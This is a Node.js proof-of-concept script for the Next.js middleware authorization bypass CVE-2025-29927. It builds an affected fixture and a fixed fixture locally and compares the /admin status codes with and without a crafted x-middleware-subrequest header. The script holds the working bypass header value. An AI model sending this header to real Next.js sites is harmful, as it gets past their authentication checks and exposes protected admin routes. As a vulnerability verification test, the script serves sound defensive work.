// Controlled runtime proof for CVE-2025-29927 (GHSA-f82v-jwr5-mffw).
// Builds two bundled fixture apps only: client-a (next 14.2.24, affected) and
// client-b (next 14.2.25, fixed). Sends the same request to /admin with and
// without the x-middleware-subrequest header and records the status codes.
// Nothing outside fixtures/ is ever fetched, built, or executed.
import { spawn } from "node:child_process";
import { cp, mkdir, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const work = path.join(root, "proof", ".work");
const CASES = [
  { client: "client-a", version: "14.2.24", port: 4311, expectBypass: 200 },
  { client: "client-b", version: "14.2.25", port: 4312, expectBypass: 307 },
];
// Next 13.2+ skips middleware once the subrequest chain reaches MAX_RECURSION_DEPTH (5).
const BYPASS_HEADER = Array(5).fill("middleware").join(":");

function run(cmd, args, cwd) {
  return new Promise((resolve, reject) => {
    const p = spawn(cmd, args, { cwd, stdio: "inherit" });
    p.on("exit", (code) => (code === 0 ? resolve() : reject(new Error(`${cmd} ${args.join(" ")} exited ${code}`))));
  });
}

async function waitForServer(port, timeoutMs = 60_000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    try {
      await fetch(`http://127.0.0.1:${port}/`);
      return;
    } catch {
      await new Promise((r) => setTimeout(r, 500));
    }
  }
  throw new Error(`server on ${port} did not start`);
}

async function status(port, headers) {
  const res = await fetch(`http://127.0.0.1:${port}/admin`, { headers, redirect: "manual" });
  return res.status;
}

async function main() {
  await rm(work, { recursive: true, force: true });
  await mkdir(work, { recursive: true });
  const rows = [];

  for (const c of CASES) {
    const dir = path.join(work, c.client);
    await cp(path.join(root, "fixtures", c.client), dir, { recursive: true });
    await rm(path.join(dir, "package-lock.json"), { force: true });
    console.log(`\n=== ${c.client} (next ${c.version}) ===`);
    await run("npm", ["install", "--no-audit", "--no-fund", "--loglevel", "error"], dir);
    await run("npm", ["run", "build"], dir);

    const server = spawn("npm", ["run", "start", "--", "-p", String(c.port)], { cwd: dir, stdio: "inherit", detached: true });
    try {
      await waitForServer(c.port);
      const plain = await status(c.port, {});
      const bypass = await status(c.port, { "x-middleware-subrequest": BYPASS_HEADER });
      rows.push({ client: c.client, next: c.version, noHeader: plain, withHeader: bypass, expectBypass: c.expectBypass });
      console.log(`no header -> ${plain}   x-middleware-subrequest -> ${bypass}`);
    } finally {
      process.kill(-server.pid, "SIGTERM");
      await new Promise((r) => setTimeout(r, 1500));
    }
  }

  const failures = rows.filter((r) => r.noHeader !== 307 || r.withHeader !== r.expectBypass);
  const report = { advisory: "GHSA-f82v-jwr5-mffw", cve: "CVE-2025-29927", header: `x-middleware-subrequest: ${BYPASS_HEADER}`, path: "/admin", ranAt: new Date().toISOString(), results: rows, pass: failures.length === 0 };
  await writeFile(path.join(root, "proof", "proof-result.json"), `${JSON.stringify(report, null, 2)}\n`);

  console.log("\nclient    next       no header   with bypass header");
  for (const r of rows) console.log(`${r.client}  ${r.next.padEnd(9)}  ${String(r.noHeader).padEnd(10)}  ${r.withHeader}`);
  console.log(failures.length === 0 ? "\nPROOF PASS: affected fixture bypassed auth, fixed fixture did not." : "\nPROOF FAIL");
  process.exit(failures.length === 0 ? 0 : 1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
